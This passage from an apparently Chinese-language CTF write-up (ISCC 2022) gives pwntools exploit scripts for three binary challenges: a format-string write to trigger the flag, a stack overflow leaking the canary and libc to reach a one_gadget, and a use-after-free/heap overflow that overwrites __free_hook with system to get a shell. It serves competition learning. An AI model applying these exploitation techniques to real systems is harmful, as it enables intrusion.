<span class="line" data-line="41"><span style="color:#B392F0">  puts</span><span style="color:#E1E4E8">(byte_804A0A3);</span></span>
<span class="line" data-line="42"><span style="color:#B392F0">  printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"your name is:"</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="43"><span style="color:#B392F0">  printf</span><span style="color:#E1E4E8">(format);</span></span>
<span class="line" data-line="44"><span style="color:#F97583">  if</span><span style="color:#E1E4E8"> ( x </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 9</span><span style="color:#E1E4E8"> )</span></span>
<span class="line" data-line="45"><span style="color:#B392F0">    flag</span><span style="color:#E1E4E8">(v12);</span></span>
<span class="line" data-line="46"><span style="color:#F97583">  else</span></span>
<span class="line" data-line="47"><span style="color:#B392F0">    putchar</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="48"><span style="color:#B392F0">  printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"your user id is: </span><span style="color:#79B8FF">%d\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, v9);</span></span>
<span class="line" data-line="49"><span style="color:#F97583">  return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="50"></span></code></pre>
<p>代码这里引用了 <code>flag</code> 文件，很简单的一个输出和 <code>cat flag</code></p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220525112330687.png" alt="image-20220525112330687"></p>
<p><code>_isoc99_scanf</code> 这个地方需要格外注意，在 <code>pust</code>提示我们需要输入name的时候，我们将内容输出出去。<code>_isoc99_scanf</code> 这里传入参数 <code>a1</code> 和 <code>a2</code> 都是 <code>int</code> 型，返回也是 <code>int</code> 型。</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> pwn </span><span style="color:#F97583">import</span><span style="color:#F97583"> *</span></span>
<span class="line" data-line="2"><span style="color:#E1E4E8">context.terminal </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [</span><span style="color:#9ECBFF">'tmux'</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'splitw'</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'-h'</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="3"><span style="color:#E1E4E8">p</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">remote(</span><span style="color:#9ECBFF">'123.57.69.203'</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">5310</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="4"><span style="color:#6A737D"># p=process('./attachment-31')</span></span>
<span class="line" data-line="5"><span style="color:#E1E4E8">x</span><span style="color:#F97583">=</span><span style="color:#79B8FF">int</span><span style="color:#E1E4E8">(p.recv(</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">)[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:],</span><span style="color:#79B8FF">16</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="6"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">hex</span><span style="color:#E1E4E8">(x))</span></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">p.recvuntil(</span><span style="color:#9ECBFF">'You will get the user id after you finish it.</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">p.sendline(</span><span style="color:#9ECBFF">'9'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="9"><span style="color:#E1E4E8">p.recvuntil(</span><span style="color:#9ECBFF">'incorrect</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">p.sendline(</span><span style="color:#9ECBFF">'9'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">p.recvuntil(</span><span style="color:#9ECBFF">'incorrect</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="12"><span style="color:#E1E4E8">p.sendline(</span><span style="color:#9ECBFF">'9'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="13"><span style="color:#6A737D"># gdb.attach(proc.pidof(p)[0])</span></span>
<span class="line" data-line="14"><span style="color:#E1E4E8">p.recvuntil(</span><span style="color:#9ECBFF">"What's your name?</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="15"></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">payload</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">fmtstr_payload(</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">, {x:</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">9</span><span style="color:#E1E4E8">})</span><span style="color:#6A737D">#11</span></span>
<span class="line" data-line="17"><span style="color:#E1E4E8">p.sendline(payload)</span></span>
<span class="line" data-line="18"><span style="color:#E1E4E8">p.interactive()</span></span></code></pre>
<h3 id="跳一跳">跳一跳</h3>
<blockquote>
<p>亲爱的CTFers，题目做累了，让我们离开电脑，一起跳一跳~</p>
</blockquote>
<p>保护全开的栈溢出，但是只能溢出 <code>0x18</code> 个字节。
正常情况是要栈迁移的，但是这题能获取靶机使用的 <code>libc</code> 版本，并且能够利用 <code>one_gadget</code></p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#6A737D">#!/usr/bin/env python2</span></span>
<span class="line" data-line="2"><span style="color:#6A737D"># -*- coding: utf-8 -*</span></span>
<span class="line" data-line="3"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> os</span></span>
<span class="line" data-line="4"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> pwn </span><span style="color:#F97583">import</span><span style="color:#F97583"> *</span></span>
<span class="line" data-line="5"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> LibcSearcher </span><span style="color:#F97583">import</span><span style="color:#F97583"> *</span></span>
<span class="line" data-line="6"><span style="color:#E1E4E8">se      </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data               :p.send(data)</span></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">sa      </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> delim,data         :p.sendafter(delim, data)</span></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">sl      </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data               :p.sendline(data)</span></span>
<span class="line" data-line="9"><span style="color:#E1E4E8">sla     </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> delim,data         :p.sendlineafter(delim, data)</span></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">sea     </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> delim,data         :p.sendafter(delim, data)</span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">rc      </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> numb</span><span style="color:#F97583">=</span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8">          :p.recv(numb)</span></span>
<span class="line" data-line="12"><span style="color:#E1E4E8">ru      </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> delims, drop</span><span style="color:#F97583">=</span><span style="color:#79B8FF">True</span><span style="color:#E1E4E8">  :p.recvuntil(delims, drop)</span></span>
<span class="line" data-line="13"><span style="color:#E1E4E8">uu32    </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data               :u32(data.ljust(</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">b</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\0</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="14"><span style="color:#E1E4E8">uu64    </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data               :u64(data.ljust(</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">b</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\0</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="15"><span style="color:#E1E4E8">info_addr </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> tag, addr        :p.info(tag </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> ': </span><span style="color:#79B8FF">{</span><span style="color:#F97583">:#x</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">.format(addr))</span></span>
<span class="line" data-line="16"></span>
<span class="line" data-line="17"><span style="color:#E1E4E8">elf </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ELF(</span><span style="color:#9ECBFF">'./attachment-10'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="18"><span style="color:#6A737D"># context(arch = elf.arch, os = 'linux',log_level = 'debug')</span></span>
<span class="line" data-line="19"><span style="color:#E1E4E8">p </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> remote(</span><span style="color:#9ECBFF">'123.57.69.203'</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">7020</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="20"><span style="color:#E1E4E8">payload</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">flat([</span><span style="color:#9ECBFF">'8 '</span><span style="color:#F97583">*</span><span style="color:#79B8FF">217</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'A'</span><span style="color:#E1E4E8">])</span></span>
<span class="line" data-line="21"><span style="color:#E1E4E8">se(payload)</span></span>
<span class="line" data-line="22"><span style="color:#E1E4E8">ru(</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x08</span><span style="color:#9ECBFF">'</span><span style="color:#F97583">*</span><span style="color:#79B8FF">217</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="23"><span style="color:#E1E4E8">canary </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> uu64(rc(</span><span style="color:#79B8FF">7</span><span style="color:#E1E4E8">))</span><span style="color:#F97583">&#x3C;&#x3C;</span><span style="color:#79B8FF">8</span></span>
<span class="line" data-line="24"><span style="color:#E1E4E8">stack </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> uu64(ru(</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x7f</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">,</span><span style="color:#FFAB70">drop</span><span style="color:#F97583">=</span><span style="color:#79B8FF">False</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="25"><span style="color:#E1E4E8">info_addr(</span><span style="color:#9ECBFF">'canary'</span><span style="color:#E1E4E8">,canary)</span></span>
<span class="line" data-line="26"><span style="color:#E1E4E8">info_addr(</span><span style="color:#9ECBFF">'stack'</span><span style="color:#E1E4E8">,stack)</span></span>
<span class="line" data-line="27"><span style="color:#E1E4E8">payload1 </span><span style="color:#F97583">=</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">'A'</span><span style="color:#F97583">*0x</span><span style="color:#79B8FF">D8</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> p64(canary)</span></span>
<span class="line" data-line="28"><span style="color:#E1E4E8">payload1 </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> p64(stack) </span><span style="color:#F97583">+</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\xA0\x50</span><span style="color:#9ECBFF">'</span></span>
<span class="line" data-line="29"><span style="color:#E1E4E8">sleep(</span><span style="color:#79B8FF">0.3</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="30"><span style="color:#6A737D"># gdb.attach(p,'b read')</span></span>
<span class="line" data-line="31"><span style="color:#E1E4E8">se(payload1)</span></span>
<span class="line" data-line="32"><span style="color:#E1E4E8">payload2</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">flat([</span><span style="color:#9ECBFF">'9 '</span><span style="color:#F97583">*0x</span><span style="color:#79B8FF">a8</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'A'</span><span style="color:#E1E4E8">])</span></span>
<span class="line" data-line="33"><span style="color:#E1E4E8">sleep(</span><span style="color:#79B8FF">0.3</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="34"><span style="color:#E1E4E8">se(payload2)</span></span>
<span class="line" data-line="35"><span style="color:#E1E4E8">ru(</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x09</span><span style="color:#9ECBFF">'</span><span style="color:#F97583">*0x</span><span style="color:#79B8FF">a8</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="36"><span style="color:#E1E4E8">libc_leak </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> uu64(rc(</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="37"><span style="color:#E1E4E8">libc_base </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> libc_leak </span><span style="color:#F97583">-</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">81150</span><span style="color:#F97583"> -</span><span style="color:#79B8FF"> 231</span></span>
<span class="line" data-line="38"><span style="color:#E1E4E8">one_gadget </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> libc_base </span><span style="color:#F97583">+</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">4f2c5</span></span>
<span class="line" data-line="39"><span style="color:#E1E4E8">info_addr(</span><span style="color:#9ECBFF">'libc_leak'</span><span style="color:#E1E4E8">,libc_leak)</span></span>
<span class="line" data-line="40"><span style="color:#E1E4E8">info_addr(</span><span style="color:#9ECBFF">'libc_base'</span><span style="color:#E1E4E8">,libc_base)</span></span>
<span class="line" data-line="41"><span style="color:#E1E4E8">payload </span><span style="color:#F97583">=</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">'A'</span><span style="color:#F97583">*0x</span><span style="color:#79B8FF">D8</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> p64(canary)</span></span>
<span class="line" data-line="42"><span style="color:#E1E4E8">payload </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> p64(stack) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(one_gadget)</span></span>
<span class="line" data-line="43"><span style="color:#E1E4E8">sleep(</span><span style="color:#79B8FF">0.3</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="44"><span style="color:#E1E4E8">se(payload)</span></span>
<span class="line" data-line="45"><span style="color:#E1E4E8">p.interactive()</span></span></code></pre>
<h3 id="untidy_note">untidy_note</h3>
<blockquote>
<p>这个笔记本不太好使</p>
</blockquote>
<p>增删查改四个功能都有。但是增加的堆块大小受到限制，不能超过 <code>31</code> 字节。</p>
<p>漏洞点存在于 <code>delete</code> 和 <code>edit</code> 功能的函数，存在 <code>UAF</code> 漏洞和 <code>堆溢出</code> 漏洞。</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#6A737D">#!/usr/bin/env python2</span></span>
<span class="line" data-line="2"><span style="color:#6A737D"># -*- coding: utf-8 -*</span></span>
<span class="line" data-line="3"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> re</span></span>
<span class="line" data-line="4"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> os</span></span>
<span class="line" data-line="5"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> this </span><span style="color:#F97583">import</span><span style="color:#E1E4E8"> d</span></span>
<span class="line" data-line="6"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> pwn </span><span style="color:#F97583">import</span><span style="color:#F97583"> *</span></span>
<span class="line" data-line="7"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> LibcSearcher </span><span style="color:#F97583">import</span><span style="color:#F97583"> *</span></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">se      </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data               :p.send(data)</span></span>
<span class="line" data-line="9"><span style="color:#E1E4E8">sa      </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> delim,data         :p.sendafter(delim, data)</span></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">sl      </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data               :p.sendline(data)</span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">sla     </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> delim,data         :p.sendlineafter(delim, data)</span></span>
<span class="line" data-line="12"><span style="color:#E1E4E8">sea     </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> delim,data         :p.sendafter(delim, data)</span></span>
<span class="line" data-line="13"><span style="color:#E1E4E8">rc      </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> numb</span><span style="color:#F97583">=</span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8">          :p.recv(numb)</span></span>
<span class="line" data-line="14"><span style="color:#E1E4E8">ru      </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> delims, drop</span><span style="color:#F97583">=</span><span style="color:#79B8FF">True</span><span style="color:#E1E4E8">  :p.recvuntil(delims, drop)</span></span>
<span class="line" data-line="15"><span style="color:#E1E4E8">uu32    </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data               :u32(data.ljust(</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">b</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\0</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">uu64    </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data               :u64(data.ljust(</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">b</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\0</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="17"><span style="color:#E1E4E8">info_addr </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> tag, addr        :p.info(tag </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> ': </span><span style="color:#79B8FF">{</span><span style="color:#F97583">:#x</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">.format(addr))</span></span>
<span class="line" data-line="18"></span>
<span class="line" data-line="19"><span style="color:#E1E4E8">elf </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ELF(</span><span style="color:#9ECBFF">'./untidy_note'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="20"><span style="color:#6A737D"># context(arch = elf.arch, os = 'linux',log_level = 'debug',terminal = ['tmux', 'splitw', '-hp','60'])</span></span>
<span class="line" data-line="21"><span style="color:#6A737D"># p = process('./untidy_note')</span></span>
<span class="line" data-line="22"><span style="color:#6A737D"># debug()</span></span>
<span class="line" data-line="23"><span style="color:#E1E4E8">p </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> remote(</span><span style="color:#9ECBFF">'123.57.69.203'</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">7030</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="24"><span style="color:#F97583">def</span><span style="color:#B392F0"> menu</span><span style="color:#E1E4E8">(choice):</span></span>
<span class="line" data-line="25"><span style="color:#E1E4E8">    sla(</span><span style="color:#9ECBFF">'Your choose is:'</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(choice))</span></span>
<span class="line" data-line="26"><span style="color:#F97583">def</span><span style="color:#B392F0"> add</span><span style="color:#E1E4E8">(size):</span></span>
<span class="line" data-line="27"><span style="color:#E1E4E8">    menu(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="28"><span style="color:#E1E4E8">    sla(</span><span style="color:#9ECBFF">'the note size is:'</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(size))</span></span>
<span class="line" data-line="29"><span style="color:#F97583">def</span><span style="color:#B392F0"> dele</span><span style="color:#E1E4E8">(id):</span></span>
<span class="line" data-line="30"><span style="color:#E1E4E8">    menu(</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="31"><span style="color:#E1E4E8">    sla(</span><span style="color:#9ECBFF">'index:'</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">id</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="32"><span style="color:#F97583">def</span><span style="color:#B392F0"> edit</span><span style="color:#E1E4E8">(id,size,data):</span></span>
<span class="line" data-line="33"><span style="color:#E1E4E8">    menu(</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="34"><span style="color:#E1E4E8">    sla(</span><span style="color:#9ECBFF">'index:'</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">id</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="35"><span style="color:#E1E4E8">    sla(</span><span style="color:#9ECBFF">'the size is:'</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(size))</span></span>
<span class="line" data-line="36"><span style="color:#E1E4E8">    sea(</span><span style="color:#9ECBFF">'Content:'</span><span style="color:#E1E4E8">,data)</span></span>
<span class="line" data-line="37"><span style="color:#F97583">def</span><span style="color:#B392F0"> show</span><span style="color:#E1E4E8">(id):</span></span>
<span class="line" data-line="38"><span style="color:#E1E4E8">    menu(</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="39"><span style="color:#E1E4E8">    sla(</span><span style="color:#9ECBFF">'index:'</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">id</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="40"><span style="color:#E1E4E8">sla(</span><span style="color:#9ECBFF">'Welcome to use untidy_note,Your name is:'</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'Coldwinds'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="41"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> _ </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">30</span><span style="color:#E1E4E8">):</span></span>
<span class="line" data-line="42"><span style="color:#E1E4E8">    add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="43"><span style="color:#E1E4E8">dele(</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="44"><span style="color:#E1E4E8">dele(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="45"><span style="color:#E1E4E8">show(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="46"><span style="color:#E1E4E8">ru(</span><span style="color:#9ECBFF">'Content:'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="47"><span style="color:#E1E4E8">heap_addr </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> uu64(rc(</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">)) </span><span style="color:#F97583">-</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">290</span></span>
<span class="line" data-line="48"><span style="color:#E1E4E8">info_addr(</span><span style="color:#9ECBFF">'Heap'</span><span style="color:#E1E4E8">,heap_addr)</span></span>
<span class="line" data-line="49"><span style="color:#E1E4E8">edit(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,p64(heap_addr</span><span style="color:#F97583">+0x</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="50"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D"># 28</span></span>
<span class="line" data-line="51"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D"># 29</span></span>
<span class="line" data-line="52"><span style="color:#E1E4E8">edit(</span><span style="color:#79B8FF">29</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">23333</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="53"><span style="color:#E1E4E8">edit(</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">20</span><span style="color:#E1E4E8">,p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">*</span><span style="color:#79B8FF">3</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p32(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">121</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="54"><span style="color:#E1E4E8">dele(</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="55"><span style="color:#E1E4E8">show(</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="56"><span style="color:#E1E4E8">ru(</span><span style="color:#9ECBFF">'Content:'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="57"><span style="color:#E1E4E8">libc_base </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> uu64(rc(</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">)) </span><span style="color:#F97583">-</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">3ebca0</span></span>
<span class="line" data-line="58"><span style="color:#E1E4E8">info_addr(</span><span style="color:#9ECBFF">'libc'</span><span style="color:#E1E4E8">,libc_base)</span></span>
<span class="line" data-line="59"><span style="color:#E1E4E8">libc </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ELF(</span><span style="color:#9ECBFF">'./libc-2.27.so'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="60"><span style="color:#E1E4E8">__free_hook </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> libc_base </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> libc.sym[</span><span style="color:#9ECBFF">'__free_hook'</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="61"><span style="color:#E1E4E8">system_addr </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> libc_base </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> libc.sym[</span><span style="color:#9ECBFF">'system'</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="62"><span style="color:#E1E4E8">dele(</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="63"><span style="color:#E1E4E8">dele(</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="64"><span style="color:#E1E4E8">edit(</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,p64(__free_hook))</span></span>
<span class="line" data-line="65"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D"># 27</span></span>
<span class="line" data-line="66"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D"># 28</span></span>
<span class="line" data-line="67"><span style="color:#E1E4E8">edit(</span><span style="color:#79B8FF">28</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,p64(system_addr))</span></span>
<span class="line" data-line="68"><span style="color:#E1E4E8">edit(</span><span style="color:#79B8FF">11</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'/bin/sh</span><span style="color:#79B8FF">\0</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="69"><span style="color:#E1E4E8">dele(</span><span style="color:#79B8FF">11</span><span style="color:#E1E4E8">)</span></span>
